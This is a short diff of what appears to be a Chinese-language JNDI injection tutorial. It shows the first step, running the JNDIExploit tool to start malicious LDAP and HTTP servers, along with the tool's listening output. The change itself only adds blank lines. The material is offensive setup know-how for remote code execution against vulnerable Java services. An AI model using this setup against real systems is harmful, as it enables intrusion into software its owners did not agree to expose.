@@ -3,6 +3,8 @@
 1、使用JNDIExploit启动LDAP与 HTTP  https://github.com/0x727/JNDIExploit
 
 eleven@192 ~> java -jar   JNDIExploit-1.3-SNAPSHOT.jar -i 127.0.0.1
+
+
 [+] LDAP Server Start Listening on 1389...
 [+] HTTP Server Start Listening on 3456...
 
